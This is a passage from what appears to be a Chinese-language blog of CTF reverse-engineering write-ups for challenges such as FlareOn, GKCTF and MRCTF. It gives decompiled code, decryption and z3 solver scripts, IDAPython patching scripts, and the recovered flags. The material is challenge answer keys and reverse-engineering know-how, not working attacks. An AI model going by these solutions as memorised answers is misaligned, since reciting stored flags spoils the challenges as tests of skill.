class="string">&#x27;\u001e&#x27;</span>, <span class="string">&#x27;\u0002&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>]</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> d:</span><br><span class="line">    code.append(<span class="built_in">ord</span>(i) ^ <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(code))</span><br></pre></td></tr></table></figure><p>flag:<code>Kitteh_save_galixy@flare-on.com</code></p><h3 id="FlareOn6-FlareBear"><a href="#FlareOn6-FlareBear" class="headerlink" title="[FlareOn6]FlareBear"></a>[FlareOn6]FlareBear</h3><p>GDA打开，可以找到一个dancewithflag</p><p>通过交叉引用查到输出flag的要求为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mass == 72, happy == 30, clean == 0</span><br></pre></td></tr></table></figure><p>找到play,clean和feed, 分别如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Feed：</span><br><span class="line">mass += 10</span><br><span class="line">happy += 2</span><br><span class="line">clean -= 1</span><br><span class="line"></span><br><span class="line">PLAY:</span><br><span class="line">mass -= 2</span><br><span class="line">happy += 4</span><br><span class="line">clean -= 1</span><br><span class="line"></span><br><span class="line">CLEAN：</span><br><span class="line">mass += 0</span><br><span class="line">happy -= 1</span><br><span class="line">clean += 6</span><br></pre></td></tr></table></figure><p>直接解方程</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">10 * feed + (-2) * play + 0 * clean == 72</span><br><span class="line">2 * feed + 4 * play + (-1) * clean == 30</span><br><span class="line">(-1) * feed + (-1) * play + 6 * clean == 0</span><br></pre></td></tr></table></figure><p>得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">clean = 2, play = 4, feed = 8</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/1770991-20200806162905386-1449555399.png" alt="img"></p><h3 id="2019红帽杯-calc"><a href="#2019红帽杯-calc" class="headerlink" title="[2019红帽杯]calc"></a>[2019红帽杯]calc</h3><p><a href="https://lantern.cool/wp-games-2019redhat/">2019 红帽杯 | Lantern’s 小站</a></p><h3 id="GKCTF-2021-Crash"><a href="#GKCTF-2021-Crash" class="headerlink" title="[GKCTF 2021]Crash"></a>[GKCTF 2021]Crash</h3><p>Go语言程序，IDA 7.6打开</p><p>main函数校验flag格式</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211104143403798.png" alt="image-20211104143403798"></p><p>进入main_check, 存在以下加密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">main_encrypto: 3des + base64</span><br><span class="line">Encrypt_HashHex2: sha256</span><br><span class="line">Encrypt_HashHex5: sha512 </span><br><span class="line">main_hash: md5</span><br></pre></td></tr></table></figure><p>3DES解密如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES3</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&quot;WelcomeToTheGKCTF2021XXX&quot;</span></span><br><span class="line">iv = <span class="string">b&quot;1Ssecret&quot;</span></span><br><span class="line">cipher = <span class="string">b&quot;o/aWPjNNxMPZDnJlNp0zK5+NLPC4Tv6kqdJqjkL0XkA=&quot;</span></span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">des3 = DES3.new(key, DES3.MODE_CBC, iv)</span><br><span class="line">plain = des3.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plain)</span><br></pre></td></tr></table></figure><p>其他的Hash网上查,或者直接爆破 , 得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GKCTF&#123;87f645e9-b628-412f-9d7a-e402f20af940&#125;</span><br></pre></td></tr></table></figure><h3 id="CFI-CTF-2018-powerPacked"><a href="#CFI-CTF-2018-powerPacked" class="headerlink" title="[CFI-CTF 2018]powerPacked"></a>[CFI-CTF 2018]powerPacked</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  tmp file powerPacker</span><br><span class="line">powerPacker: ELF 32-bit MSB executable, PowerPC or cisco 4500, version 1 (GNU/Linux), statically linked, stripped</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105194945152.png" alt="image-20211105194945152"></p><p>upx解压后</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [-58h]</span></span><br><span class="line">  _BYTE v5[<span class="number">32</span>]; <span class="comment">// [sp+10h] [-50h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v6[<span class="number">24</span>]; <span class="comment">// [sp+30h] [-30h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [sp+48h] [-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v8; <span class="comment">// [sp+4Ch] [-14h]</span></span><br><span class="line"></span><br><span class="line">  v7 = argc;</span><br><span class="line">  v8 = argv;</span><br><span class="line">  <span class="built_in">strcpy</span>(v6, <span class="string">&quot;EHK&#125;kanqxgarqygtre&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Insert password : &quot;</span>, argv, envp);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%31s&quot;</span>, v5);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">21</span>; ++i )</span><br><span class="line">    v6[i] -= <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(v5, v6) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong password.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Password is correct. Submit this as the flag.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">b&quot;EHK&#125;kanqxgarqygtre&quot;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">flag.append(i - <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="FlareOn4-greek-to-me"><a href="#FlareOn4-greek-to-me" class="headerlink" title="[FlareOn4]greek_to_me"></a>[FlareOn4]greek_to_me</h3><p>反编译出来以后，主函数中存在一段SMC</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105204329643.png" alt="image-20211105204329643"></p><p>其中v3来自<code>buf[0]</code>, 而buf来自下面的函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">SOCKET __cdecl <span class="title">sub_401121</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  SOCKET v2; <span class="comment">// esi</span></span><br><span class="line">  SOCKET v3; <span class="comment">// eax</span></span><br><span class="line">  SOCKET v4; <span class="comment">// edi</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">WSAData</span> <span class="title">WSAData</span>;</span> <span class="comment">// [esp+0h] [ebp-1A0h] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">name</span>;</span> <span class="comment">// [esp+190h] [ebp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( WSAStartup(<span class="number">0x202</span>u, &amp;WSAData) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 != <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    name.sa_family = <span class="number">2</span>;</span><br><span class="line">    *(_DWORD *)&amp;name.sa_data[<span class="number">2</span>] = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    *(_WORD *)name.sa_data = htons(<span class="number">0x8AE</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( bind(v2, &amp;name, <span class="number">16</span>) != <span class="number">-1</span> &amp;&amp; listen(v2, <span class="number">0x7FFFFFFF</span>) != <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = accept(v2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = v3;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">-1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( recv(v3, buf, <span class="number">4</span>, <span class="number">0</span>) &gt; <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> v4;</span><br><span class="line">        closesocket(v4);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(v2);</span><br><span class="line">  &#125;</span><br><span class="line">  WSACleanup();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>监听本地<code>2222</code>端口, 并接受4个字节</p><p>由于主函数中有校验, 如果成功会输出<code>Congratulations! But wait, where&#39;s my flag?</code></p><p>那么我们可以通过爆破将这个<code>buf[0]</code>算出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="number">2222</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">255</span>):</span><br><span class="line">    os.startfile(<span class="string">&quot;greek_to_me.exe&quot;</span>)</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((ip, port))</span><br><span class="line">    s.send(<span class="built_in">chr</span>(i))</span><br><span class="line">    data = s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.close()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Congratulations&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%x&quot;</span> % i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>可得<code>buf</code>值为<code>a2</code></p><p>则可自己写个<code>idapython</code>脚本进行解密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">buf = ida_bytes.get_bytes(<span class="number">0x04010A0</span>, <span class="number">121</span>)</span><br><span class="line">buf = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: ((x ^ <span class="number">0xa2</span>) + <span class="number">34</span>) &amp; <span class="number">0xff</span>, buf))</span><br><span class="line">ida_bytes.patch_bytes(<span class="number">0x04010A0</span>, <span class="built_in">bytes</span>(buf))</span><br></pre></td></tr></table></figure><p>解密后得到flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105212736008.png" alt="image-20211105212736008"></p><p>写个脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bg = <span class="number">0x0040107C</span></span><br><span class="line">end = <span class="number">0x004010F1</span></span><br><span class="line"></span><br><span class="line">addr = bg</span><br><span class="line">flag = []</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    <span class="keyword">if</span> addr == <span class="number">0x0040107C</span> <span class="keyword">or</span> addr == <span class="number">0x00401085</span>:</span><br><span class="line">        addr = next_instr(addr)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    d = get_operand_value(addr, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0x12</span>:</span><br><span class="line">        flag.append(<span class="number">0x5F</span>)</span><br><span class="line">    <span class="keyword">elif</span> d == <span class="number">0x13</span>:</span><br><span class="line">        flag.append(<span class="number">0x65</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag.append(get_operand_value(addr, <span class="number">1</span>))</span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><p>得<code>flag</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">et_tu_brute_force@flare-on.com</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-Tricky-Part1"><a href="#INSHack2018-Tricky-Part1" class="headerlink" title="[INSHack2018]Tricky-Part1"></a>[INSHack2018]Tricky-Part1</h3><p>校验函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> *__fastcall <span class="title">stack_check</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// rax</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+1Bh] [rbp-25h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(v8, <span class="string">&quot;GDB&quot;</span>, &amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v6);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = i;</span><br><span class="line">    <span class="keyword">if</span> ( v4 &gt;= <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;base) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v1 = i;</span><br><span class="line">    v2 = <span class="built_in">std</span>::<span class="built_in">string</span>::size((<span class="built_in">std</span>::<span class="built_in">string</span> *)v8);</span><br><span class="line">    LOBYTE(v1) = *(_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[](v8, v1 % v2);</span><br><span class="line">    v3 = (_BYTE *)<span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[](&amp;base, i);</span><br><span class="line">    *v3 ^= v1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(a1, (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;base);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>(v8);</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中异或的数组<code>GDB</code></p><p>base初始化函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __fastcall __static_initialization_and_destruction_0(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">17</span>]; <span class="comment">// [rsp+1Fh] [rbp-11h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">1</span> &amp;&amp; a2 == <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">std</span>::ios_base::Init::Init((<span class="built_in">std</span>::ios_base::Init *)&amp;<span class="built_in">std</span>::__ioinit);</span><br><span class="line">    __cxa_atexit(<span class="built_in">std</span>::ios_base::Init::~Init, &amp;<span class="built_in">std</span>::__ioinit, &amp;_dso_handle);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(v3);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;base, &amp;byte_401278, v3);</span><br><span class="line">    <span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(v3);</span><br><span class="line">    <span class="keyword">return</span> __cxa_atexit(<span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>, &amp;base, &amp;_dso_handle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x0E</span>, <span class="number">0x0A</span>, <span class="number">0x11</span>, <span class="number">0x06</span>, <span class="number">0x3F</span>, <span class="number">0x01</span>, <span class="number">0x1F</span>, <span class="number">0x1C</span>, <span class="number">0x1D</span>, <span class="number">0x76</span>, <span class="number">0x37</span>, <span class="number">0x1D</span>, <span class="number">0x2F</span>, <span class="number">0x70</span>, <span class="number">0x30</span>, <span class="number">0x23</span>, <span class="number">0x77</span>, <span class="number">0x30</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x72</span>, <span class="number">0x35</span>, <span class="number">0x1B</span>, <span class="number">0x31</span>, <span class="number">0x33</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x76</span>, <span class="number">0x27</span>, <span class="number">0x1D</span>, <span class="number">0x73</span>, <span class="number">0x2A</span>, <span class="number">0x76</span>, <span class="number">0x2B</span>, <span class="number">0x75</span>, <span class="number">0x31</span>, <span class="number">0x3E</span>, <span class="number">0x37</span>, <span class="number">0x1D</span>, <span class="number">0x30</span>, <span class="number">0x2C</span>, <span class="number">0x71</span>, <span class="number">0x29</span>, <span class="number">0x1B</span>, <span class="number">0x26</span>, <span class="number">0x74</span>, <span class="number">0x26</span>, <span class="number">0x37</span>, <span class="number">0x20</span>, <span class="number">0x23</span>, <span class="number">0x71</span>, <span class="number">0x35</span>, <span class="number">0x1B</span>, <span class="number">0x24</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x2E</span>, <span class="number">0x34</span>, <span class="number">0x39</span>]</span><br><span class="line"></span><br><span class="line">xor_data = <span class="string">b&quot;GDB&quot;</span></span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    flag.append(data[i] ^ xor_data[i % <span class="number">3</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><h3 id="MRCTF2020-VirtualTree"><a href="#MRCTF2020-VirtualTree" class="headerlink" title="[MRCTF2020]VirtualTree"></a>[MRCTF2020]VirtualTree</h3><p>动调，可以看到题目存在代码自修改与花指令</p><p>先写脚本去花</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line">bg = <span class="number">0x0401470</span></span><br><span class="line">end = <span class="number">0x0040160B</span></span><br><span class="line"></span><br><span class="line">addr = bg</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_instr</span>(<span class="params">addr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> addr+get_item_size(addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;jz&quot;</span> == print_insn_mnem(addr):</span><br><span class="line">        <span class="keyword">if</span> ida_bytes.get_byte(addr+<span class="number">0x2</span>) == <span class="number">0xe8</span>:</span><br><span class="line">            patch_byte(addr + <span class="number">0x2</span>, <span class="number">0x90</span>)</span><br><span class="line">            addr += <span class="number">0x3</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    addr = next_instr(addr)</span><br><span class="line">addr = bg</span><br><span class="line"><span class="keyword">while</span> addr &lt; end:</span><br><span class="line">    ida_bytes.del_items(addr)</span><br><span class="line">    addr = next_instr(addr)</span><br></pre></td></tr></table></figure><p>动调起来就可以看到具体的函数了，分析如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_A416F0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  add(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">  add(<span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">  subabs(<span class="number">3</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">  subabs(<span class="number">6</span>, <span class="number">1</span>);</span><br><span class="line">  add(<span class="number">7</span>, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">8</span>, <span class="number">7</span>);</span><br><span class="line">  subabs(<span class="number">9</span>, <span class="number">8</span>);</span><br><span class="line">  subabs(<span class="number">10</span>, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">11</span>, <span class="number">12</span>);</span><br><span class="line">  subabs(<span class="number">12</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">xor</span>(<span class="number">14</span>, <span class="number">15</span>);</span><br><span class="line">  add(<span class="number">15</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>add函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">add</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  input[a1] += a2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>xor函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">xor</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  input[a1] ^= input[a2];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>subabs函数：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">subabs</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="keyword">unsigned</span> __int8)input[a1] - (<span class="keyword">unsigned</span> __int8)input[a2];</span><br><span class="line">  input[a1] = (BYTE4(v2) ^ v2) - BYTE4(v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对比数据<code>cmp_data = [0x17, 0x63, 0x77, 0x03, 0x52, 0x2E, 0x4A, 0x28, 0x52, 0x1B, 0x17, 0x12, 0x3A, 0x0A, 0x6C, 0x62]</code></p><p>输入的flag会先异或一下</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105225039661.png" alt="image-20211105225039661"></p><p>可以下断将异或的数据打出来</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105225122392.png" alt="image-20211105225122392"></p><p>得到异或数据<code>xor_data = [77,76,71,80,79,75,70,67,74,69,78,73,72,68,66,65]</code></p><p>则解密脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">cmp_data = [<span class="number">0x17</span>, <span class="number">0x63</span>, <span class="number">0x77</span>, <span class="number">0x03</span>, <span class="number">0x52</span>, <span class="number">0x2E</span>, <span class="number">0x4A</span>,</span><br><span class="line">            <span class="number">0x28</span>, <span class="number">0x52</span>, <span class="number">0x1B</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x6C</span>, <span class="number">0x62</span>]</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">_data = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">data = _data[:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    data[a1] += a2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Xor</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    data[a1] ^= data[a2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Subabs</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    <span class="keyword">global</span> data</span><br><span class="line">    n = data[a1] - data[a2]</span><br><span class="line">    data[a1] = (n ^ (n &gt;&gt; <span class="number">31</span>)) - (n &gt;&gt; <span class="number">31</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Add(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">Xor(<span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line">Add(<span class="number">2</span>, <span class="number">7</span>)</span><br><span class="line">Subabs(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">Xor(<span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">Subabs(<span class="number">6</span>, <span class="number">1</span>)</span><br><span class="line">Add(<span class="number">7</span>, <span class="number">3</span>)</span><br><span class="line">Xor(<span class="number">8</span>, <span class="number">7</span>)</span><br><span class="line">Subabs(<span class="number">9</span>, <span class="number">8</span>)</span><br><span class="line">Subabs(<span class="number">10</span>, <span class="number">7</span>)</span><br><span class="line">Xor(<span class="number">11</span>, <span class="number">12</span>)</span><br><span class="line">Subabs(<span class="number">12</span>, <span class="number">2</span>)</span><br><span class="line">Xor(<span class="number">14</span>, <span class="number">15</span>)</span><br><span class="line">Add(<span class="number">15</span>, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    data[i] &amp;= <span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(data, cmp_data):</span><br><span class="line">    s.add(i == j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    s.add(_data[i] &gt;= <span class="number">0</span>)</span><br><span class="line">    s.add(_data[i] &lt;= <span class="number">0x7f</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    flag = []</span><br><span class="line">    xor_data = [<span class="number">77</span>, <span class="number">76</span>, <span class="number">71</span>, <span class="number">80</span>, <span class="number">79</span>, <span class="number">75</span>, <span class="number">70</span>, <span class="number">67</span>, <span class="number">74</span>, <span class="number">69</span>, <span class="number">78</span>, <span class="number">73</span>, <span class="number">72</span>, <span class="number">68</span>, <span class="number">66</span>, <span class="number">65</span>]</span><br><span class="line">    conditions = []</span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(_data, xor_data):</span><br><span class="line">        flag.append(m[i].as_long() ^ j)</span><br><span class="line">        conditions.append(i != m[i].as_long())</span><br><span class="line">    s.add(Or(conditions))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><p>跑出来有好几个结果, 第二个就是flag</p><p><img src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211105231836000.png" alt="image-20211105231836000"></p><p>这道题多解233333</p><p><img 